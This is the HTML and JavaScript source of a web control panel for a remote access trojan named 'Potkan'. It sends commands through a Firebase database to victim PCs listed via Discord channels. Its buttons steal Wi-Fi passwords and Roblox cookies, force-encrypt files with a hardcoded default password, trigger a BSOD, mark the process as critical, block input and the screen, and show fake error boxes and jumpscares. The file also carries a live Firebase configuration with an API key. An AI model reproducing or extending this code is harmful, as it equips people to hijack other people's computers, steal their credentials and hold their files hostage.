<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Multi-PC Control | Potkan</title>
    <style>
        :root { --bg: #0f172a; --card: #1e293b; --text: #e2e8f0; --accent: #3b82f6; --danger: #ef4444; --success: #22c55e; --warn: #eab308; }
        body { background-color: var(--bg); color: var(--text); font-family: 'Segoe UI', sans-serif; margin: 0; padding: 20px; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
        h1 { background: linear-gradient(135deg, var(--accent), #8b5cf6); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-size: 2.5rem; margin-bottom: 2rem; text-transform: uppercase; }
        
        /* AUTH BAR */
        .auth-bar {
            position: fixed; top: 20px; left: 20px; display: flex; flex-direction: column; gap: 10px;
            z-index: 1000; background: rgba(30, 41, 59, 0.8); padding: 10px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.1);
        }
        .user-email { color: #94a3b8; font-size: 0.85rem; font-weight: bold; }
        .logout-btn { padding: 6px 12px; background: rgba(239, 68, 68, 0.2); border: 1px solid var(--danger); color: #fca5a5; border-radius: 6px; cursor: pointer; font-size: 0.8rem; }
        .logout-btn:hover { background: var(--danger); color: white; }

        .pc-selector { width: 100%; max-width: 600px; margin-bottom: 30px; background: var(--card); padding: 20px; border-radius: 12px; border: 1px solid var(--accent); text-align: center; margin-top: 40px; }
        .pc-selector select { width: 100%; padding: 15px; font-size: 1.1rem; background: #0f172a; color: white; border: 1px solid #334155; border-radius: 8px; margin-top: 10px; }

        #mainDashboard { display: none; width: 100%; max-width: 1200px; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; }
        
        .card { background: var(--card); padding: 20px; border-radius: 16px; border: 1px solid rgba(255,255,255,0.05); }
        .card-header { font-size: 1.2rem; font-weight: bold; margin-bottom: 15px; border-bottom: 1px solid rgba(255,255,255,0.1); padding-bottom: 10px; }
        .grid-buttons { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
        button { padding: 12px; border: none; border-radius: 8px; font-weight: 600; cursor: pointer; color: white; background: #334155; width: 100%; }
        button:hover { filter: brightness(1.2); }
        .btn-danger { background: var(--danger); }
        .btn-success { background: var(--success); }
        .btn-warn { background: var(--warn); color: black; }
        .btn-info { background: var(--accent); }
        .btn-gray { background: #475569; }
        .full-width { grid-column: span 2; }

        .logs-container { width: 100%; max-width: 1200px; margin-top: 25px; background: #0f172a; border: 1px solid #334155; border-radius: 12px; padding: 20px; box-sizing: border-box; }
        .log-title { color: #94a3b8; font-size: 0.9rem; margin-bottom: 10px; text-transform: uppercase; letter-spacing: 1px; }
        .log-list { list-style: none; padding: 0; margin: 0; max-height: 200px; overflow-y: auto; }
        .log-item { padding: 8px 12px; border-bottom: 1px solid rgba(255,255,255,0.05); font-family: monospace; font-size: 0.9rem; color: #ccc; display: flex; justify-content: space-between; }
        .log-time { color: #64748b; font-size: 0.8rem; }
        .log-cmd { color: var(--accent); font-weight: bold; }
    </style>
</head>
<body>

    <div class="auth-bar">
        <span id="userDisplay" class="user-email">Checking...</span>
        <button class="logout-btn" onclick="logout()">Log Out</button>
    </div>

    <h1>ğŸš€ Multi-PC Command</h1>

    <div class="pc-selector">
        <h3>ğŸ¯ Select Target PC</h3>
        <select id="categorySelect" onchange="selectPC()">
            <option value="">ğŸ”„ Loading PC List...</option>
        </select>
        <p id="targetStatus" style="margin-top:10px; color:#aaa; font-size:0.9rem;">Please select a PC to control.</p>
    </div>

    <div id="mainDashboard" class="dashboard"> 
        
        <!-- POWER & INPUT -->
        <div class="card" style="border-color: #ff9100;">
            <div class="card-header">âš¡ Power & Input</div>
            <div class="grid-buttons">
                <button class="btn-info" onclick="cmd('lock_pc')">ğŸ”’ Lock PC</button>
                <button class="btn-warn" onclick="cmd('restart_pc')">ğŸ”„ Restart</button>
                <button class="btn-danger full-width" onclick="confirmAction('shutdown_pc')">ğŸ›‘ Shutdown</button>
                <button class="btn-danger full-width" onclick="confirmAction('bsod')">ğŸ’€ BSOD</button>
                <button class="btn-danger" onclick="toggleInput(true)">ğŸš« Block Input</button>
                <button class="btn-success" onclick="toggleInput(false)">âœ… Free Input</button>
                <button class="btn-danger full-width" onclick="cmd('block_screen')">â¬› Block Screen</button>
            </div>
        </div>
        
        <!-- SYSTEM & TASKBAR -->
        <div class="card" style="border-color: #3b82f6;">
            <div class="card-header">ğŸ› ï¸ System & Taskbar</div>
            <div class="grid-buttons">
                <button class="btn-info" onclick="cmd('check_admin')">ğŸ›¡ï¸ Check Admin</button>
                <button class="btn-danger" onclick="confirmAction('set_critical')">âš ï¸ Set Critical</button>
                <button class="btn-success" onclick="cmd('unset_critical')">âœ… Unset Critical</button>
                <button class="btn-gray" onclick="cmd('hide_taskbar')">ğŸ™ˆ Hide Taskbar</button>
                <button class="btn-info" onclick="cmd('show_taskbar')">ğŸ‘ï¸ Show Taskbar</button>
                <button class="btn-danger" onclick="askBlacklist()">âŒ Blacklist App</button>
                <button class="btn-success" onclick="askWhitelist()">âœ… Whitelist App</button>
            </div>
        </div>

        <!-- STEALERS -->
        <div class="card" style="border-color: #a855f7;">
            <div class="card-header">ğŸ•µï¸ Stealers</div>
            <div class="grid-buttons">
                <button class="btn-info full-width" onclick="cmd('wifi_stealer')">ğŸ“¶ Steal Wi-Fi</button>
                <button class="btn-warn full-width" onclick="cmd('grab_roblox')">ğŸª Grab Roblox Cookie</button>
            </div>
        </div>

        <!-- ENCRYPTION -->
        <div class="card" style="border-color: #ef4444;">
            <div class="card-header">ğŸ” Encryption</div>
            <div class="grid-buttons">
                <button class="btn-danger full-width" onclick="askForceEncrypt()">ğŸ’€ Force Encrypt</button>
                <button class="btn-success full-width" onclick="askDecrypt()">ğŸ”“ Decrypt Files</button>
                <button class="btn-info full-width" onclick="cmd('encryption_status')">â„¹ï¸ Check Status</button>
            </div>
        </div>

        <!-- MEDIA -->
        <div class="card" style="border-color: #3cff6d;">
            <div class="card-header">ğŸ”Š Media</div>
            <div class="grid-buttons">
                <button class="btn-gray" onclick="cmd('mute')">ğŸ”‡ Mute</button>
                <button class="btn-success" onclick="cmd('unmute')">ğŸ”Š Unmute</button>
                <button class="btn-info full-width" onclick="askTTS()">ğŸ—£ï¸ Speak</button>
                <div class="full-width"><input type="range" min="0" max="100" value="50" onchange="setVolume(this.value)" style="width:100%"></div>
            </div>
        </div>

        <!-- FUN & NETWORK -->
        <div class="card" style="border-color: #00ffff;">
            <div class="card-header">ğŸ‘» Fun & Network</div>
            <div class="grid-buttons">
                <button class="btn-warn full-width" onclick="cmd('jumpscare')">ğŸ‘» Jumpscare</button>
                <button class="btn-info full-width" onclick="askMsgBox()">ğŸ’¬ Fake Error</button>
                <button class="btn-success full-width" onclick="askURL()">ğŸŒ Open URL</button>
                <button class="btn-warn" onclick="askBlockURL()">ğŸš« Block Site</button>
                <button class="btn-gray" onclick="askUnblockURL()">ğŸ”“ Unblock Site</button>
            </div>
        </div>
    </div>

    <!-- LOGS -->
    <div class="logs-container" style="border-color: #ffffffab;">
        <div class="log-title">Command History</div>
        <ul class="log-list" id="logList"></ul>
    </div>

    <!-- SCRIPT -->
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getAuth, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
        import { getDatabase, ref, set, get, child, push, onValue, limitToLast, query } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

        const firebaseConfig = {
            apiKey: "AIzaSyBhG3jjUoP6F-MHIqYKP7TvCh4FQ_Rfcd0",
            authDomain: "potkan-5132c.firebaseapp.com",
            databaseURL: "https://potkan-5132c-default-rtdb.firebaseio.com/",
            projectId: "potkan-5132c",
            storageBucket: "potkan-5132c.firebasestorage.app",
            messagingSenderId: "1049909900706",
            appId: "1:1049909900706:web:f4d5b811a98760f0862efb"
        };

        const app = initializeApp(firebaseConfig);
        const auth = getAuth(app); 
        const db = getDatabase(app);
        const dbRef = ref(db);
        const ADMIN_UID = "sJSL8EjvFhMpoiD4yaAThWDKsf32"; 

        onAuthStateChanged(auth, (user) => {
            if (user && user.uid === ADMIN_UID) {
                document.getElementById('userDisplay').innerText = user.email;
            } else {
                window.location.href = "index.html";
            }
        });

        window.logout = () => signOut(auth).then(() => window.location.href = "index.html");

        window.currentTargetID = null; 
        window.currentPCName = "Unknown";

        // LOAD PC STRUCTURE
        get(child(dbRef, `discord_structure`)).then((snapshot) => {
            const select = document.getElementById('categorySelect');
            if (snapshot.exists()) {
                const data = snapshot.val();
                const structure = data.structure || data;
                select.innerHTML = `<option value="">-- Select PC (Updated: ${data.last_updated || "now"}) --</option>`;
                for (const [serverName, categories] of Object.entries(structure)) {
                    if (serverName === "last_updated") continue;
                    const group = document.createElement('optgroup');
                    group.label = serverName;
                    for (const catName of Object.keys(categories)) {
                        const option = document.createElement('option');
                        option.value = JSON.stringify({ server: serverName, category: catName });
                        option.innerText = `ğŸ–¥ï¸ ${catName}`;
                        group.appendChild(option);
                    }
                    select.appendChild(group);
                }
            } else {
                select.innerHTML = '<option>No PCs Found</option>';
            }
        });

        // HANDLE PC SELECTION
        window.selectPC = function() {
            const val = document.getElementById('categorySelect').value;
            const dashboard = document.getElementById('mainDashboard');
            const status = document.getElementById('targetStatus');

            if (!val) {
                dashboard.style.display = "none";
                status.innerText = "Select a PC to continue.";
                status.style.color = "#aaa";
                return;
            }
            
            const { server, category } = JSON.parse(val);
            window.currentPCName = category;
            
            get(child(dbRef, `discord_structure`)).then((snap) => {
                const channels = (snap.val().structure || snap.val())[server][category];
                const targetNames = ["remote-access", "ğ•£ğ•–ğ•ğ• ğ•¥ğ•–-ğ•’ğ•”ğ•”ğ•–ğ•¤ğ•¤", "cmd", "terminal"];
                let foundID = null;

                for (const [id, name] of Object.entries(channels)) {
                    if (targetNames.includes(name.toLowerCase())) {
                        foundID = id;
                        break;
                    }
                }

                if (foundID) {
                    window.currentTargetID = foundID;
                    dashboard.style.display = "grid"; 
                    status.innerText = `âœ… Connected to: ${category}`;
                    status.style.color = "#22c55e";
                    addLog(`Connected to PC: ${category}`);
                } else {
                    dashboard.style.display = "none";
                    status.innerText = `âŒ Error: No 'remote-access' channel in '${category}'.`;
                    status.style.color = "#ef4444";
                }
            });
        };

        // LOGGING
        const logsRef = query(ref(db, 'logs'), limitToLast(20));
        onValue(logsRef, (snap) => {
            const list = document.getElementById('logList');
            list.innerHTML = ""; 
            if(snap.exists()) {
                Object.values(snap.val()).reverse().forEach(log => {
                    const li = document.createElement('li');
                    li.className = 'log-item';
                    li.innerHTML = `<span class="log-cmd">> ${log.message}</span><span class="log-time">${new Date(log.timestamp).toLocaleTimeString()}</span>`;
                    list.appendChild(li);
                });
            }
        });

        function addLog(msg) {
            push(ref(db, 'logs'), { message: msg, timestamp: Date.now() });
        }

        // COMMANDS
        function writeDB(data) {
            if (!window.currentTargetID) return alert("No Target PC Selected!");
            data.target_id = window.currentTargetID;
            data.timestamp = Date.now();
            set(ref(db, 'queue/pending'), data);
            addLog(`[${window.currentPCName}] Sent: ${data.type}`);
        }

        window.cmd = (type) => writeDB({ type });
        window.confirmAction = (type) => { if(confirm("This is a dangerous action. Are you sure?")) cmd(type); };
        window.toggleInput = (block) => cmd(block ? 'disable_input' : 'enable_input');
        
        window.askTTS = () => { const t = prompt("Text to speak:"); if(t) writeDB({type:'tts', text:t}); };
        window.askURL = () => { const u = prompt("URL to open:"); if(u) writeDB({type:'open_url', url:u}); };
        window.askMsgBox = () => { const t = prompt("Message for box:"); if(t) writeDB({type:'msgbox', text:t}); };
        window.setVolume = (v) => writeDB({type:'volume', value:v});
        window.askBlockURL = () => { const d = prompt("Domain to block:"); if(d) writeDB({type:'block_url', domain:d}); };
        window.askUnblockURL = () => { const d = prompt("Domain to unblock:"); if(d) writeDB({type:'unblock_url', domain:d}); };
        window.askBlacklist = () => { const n = prompt("Process name to blacklist:"); if(n) writeDB({type:'blacklist', name:n}); };
        window.askWhitelist = () => { const n = prompt("Process name to whitelist:"); if(n) writeDB({type:'whitelist', name:n}); };
        
        window.askForceEncrypt = () => {
            const p = prompt("Set Encryption Password (or leave empty for default):");
            if(confirm("âš ï¸ DANGER: This will encrypt files! Proceed?")) {
                writeDB({type:'force_encrypt', password: p || "scripty_rat_best_777"});
            }
        };
        window.askDecrypt = () => {
            const p = prompt("Enter Decryption Password:");
            if (p) writeDB({type:'decrypt_files', password: p});
        };
    </script>
</body>
</html>
